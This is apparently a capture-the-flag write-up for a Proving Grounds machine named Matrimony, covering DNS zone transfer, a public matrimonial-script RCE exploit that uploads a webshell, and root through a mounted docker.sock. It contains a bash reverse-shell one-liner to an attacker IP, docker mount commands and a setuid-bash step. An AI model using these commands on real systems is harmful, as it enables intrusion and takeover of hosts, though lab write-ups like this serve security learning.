# Matrimony

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.201.196
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-15 14:46 +08
Nmap scan report for 192.168.201.196
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
53/tcp    open     domain
80/tcp    open     http
```

DNS is open, so we likely need to find a domain name somewhere.

### DNS Enum

Port 80 just shows us a static site:

<figure><img src="../../../.gitbook/assets/image (3999).png" alt=""><figcaption></figcaption></figure>

There wasn't anything interesting about this site, so I went back to DNS. Similar to HTB, some machines from PGP tend to have domain names we just enter into our `/etc/hosts` file. I entered a few like `matrimony.pg`, `matrimony.offsec` and `matrimony.off`.

Then, I tested each domain with `dig` to see which exists. `matrimony.off` reveals the most information:

```
$ dig axfr @192.168.201.196 matrimony.off

; <<>> DiG 9.18.12-1-Debian <<>> axfr @192.168.201.196 matrimony.off
; (1 server found)
;; global options: +cmd
matrimony.off.          604800  IN      SOA     matrimony.off. root.matrimony.off. 4 604800 86400 2419200 604800
matrimony.off.          604800  IN      NS      matrimony.off.
matrimony.off.          604800  IN      A       127.0.0.1
matrimony.off.          604800  IN      AAAA    ::1
prod99.matrimony.off.   604800  IN      CNAME   matrimony.off.
matrimony.off.          604800  IN      SOA     matrimony.off. root.matrimony.off. 4 604800 86400 2419200 604800
;; Query time: 164 msec
;; SERVER: 192.168.201.196#53(192.168.201.196) (TCP)
;; WHEN: Sat Jul 15 14:53:15 +08 2023
;; XFR size: 6 records (messages 1, bytes 226)
```

It also finds another subdomain at `prod99`.&#x20;

### Matrimonial Website -> RCE

The `prod99` domain shows us this marriage website:

<figure><img src="../../../.gitbook/assets/image (1630).png" alt=""><figcaption></figcaption></figure>

I created an account on the website and found that it runs on PHP. I checked around for exploits for 'matrim':

```
$ searchsploit matrim
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
2DayBiz Matrimonial Script - 'smartresult.php' SQL Injecti | php/webapps/14073.txt
2DayBiz Matrimonial Script - SQL Injection                 | php/webapps/14008.txt
2DayBiz Matrimonial Script - SQL Injection / Cross-Site Sc | php/webapps/14047.txt
Advanced Matrimonial Script 2.0.3 - SQL Injection          | php/webapps/41521.txt
Entrepreneur Matrimonial Script - Authentication Bypass    | php/webapps/41046.txt
Hindu Matrimonial Script - Authentication Bypass           | php/webapps/41044.txt
i-Net Solution Matrimonial Script 2.0.3 - 'alert.php' Cros | php/webapps/34252.txt
Matri4Web Matrimony Website Script - Multiple SQL Injectio | php/webapps/46591.txt
Matrimonial Script - SQL Injection                         | php/webapps/42545.txt
Matrimonial Script 2.7 - Authentication Bypass             | php/webapps/42566.txt
Matrimonial Website Script 1.0.2 - SQL Injection           | php/webapps/40416.txt
Matrimonial Website Script 2.1.6 - 'uid' SQL Injection     | php/webapps/43965.txt
Matrimony Script - Cross-Site Request Forgery              | php/webapps/10517.txt
Matrimony Script 2.7 - SQL Injection                       | php/webapps/42496.txt
Multireligion Responsive Matrimonial 4.7.2 - 'succid' SQL  | php/webapps/43299.txt
Multireligion Responsive Matrimonial Script 4.7.1 - SQL In | php/webapps/41530.txt
Muslim Matrimonial Script 3.02 - 'succid' SQL Injection    | php/webapps/43310.txt
Online Matrimonial Project 1.0 - Authenticated Remote Code | php/webapps/49183.py
PHP Matrimonial Script 3.0 - SQL Injection                 | php/webapps/41525.txt
Responsive Matrimonial Script 4.0.1 - SQL Injection        | php/webapps/41533.txt
Zeeways Matrimony CMS - SQL Injection                      | php/webapps/46603.txt
----------------------------------------------------------- ---------------------------------
```

Tons of exploits, and there is one script out of all of them. I tried that first, and it worked:

```
$ python2 49183.py http://prod99.matrimony.off/ test123 test123
___  ___              _  _          _      ______  _____  _____
|  \/  |             (_)| |        | |     | ___ \/  __ \|  ___|                             
| .  . |  __ _  _ __  _ | |_  __ _ | |     | |_/ /| /  \/| |__                               
| |\/| | / _` || '__|| || __|/ _` || |     |    / | |    |  __|                              
| |  | || (_| || |   | || |_| (_| || |     | |\ \ | \__/\| |___                              
\_|  |_/ \__,_||_|   |_| \__|\__,_||_|     \_| \_| \____/\____/                              
                                                                                             
[+] logging...                                                                               
[+] Successfully retrieved user [ID].
[+] Successfully uploaded.
[+] Connecting to webshell...
[+] Successfully connected to webshell.
$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam)
```

From here, we can easily get a reverse shell:

```
$ bash -c 'bash -i >& /dev/tcp/192.168.45.189/21 0>&1'
```

<figure><img src="../../../.gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Docker.Sock -> Root

If we check `ifconfig`, we can find some Docker instanceis running since the IP of this machine is 172.17.0.1:

```
sam@matrimony:/home/sam$ ifconfig                                                            
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500                                
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255                       
        ether 02:42:58:23:b6:06  txqueuelen 0  (Ethernet)
        RX packets 19  bytes 4172 (4.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 19  bytes 4427 (4.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We can `ssh` into 172.17.0.2 as `root`:

<figure><img src="../../../.gitbook/assets/image (3996).png" alt=""><figcaption></figcaption></figure>

We can find the `docker.sock` file in both machines:

```
root@9079b6b2d2fb:/tmp# find / -name docker.sock 2>/dev/null
/run/docker.sock
```

This machine doesn't have `docker`, so we can download the binary itself from our machine. This takes a while. When it's done, we can check the images present:

```
root@9079b6b2d2fb:/tmp# ./docker images
REPOSITORY   TAG       IMAGE ID       CREATED         SIZE
<none>       <none>    73aebf20ceb1   14 months ago   223MB
ubuntu       latest    3f4714ee068a   14 months ago   77.8MB
```

We can mount back onto the first image:

```
./docker -H unix:///run/docker.sock run -it -v /:/mnt 73aebf20ceb1 bash
```

<figure><img src="../../../.gitbook/assets/image (1807).png" alt=""><figcaption></figcaption></figure>

To get a `root` shell, simply run `chmod u+s /mnt/bin/bash`. Exit the docker container back onto the host machine and run `bash -p`:

<figure><img src="../../../.gitbook/assets/image (1622).png" alt=""><figcaption></figcaption></figure>

Rooted!
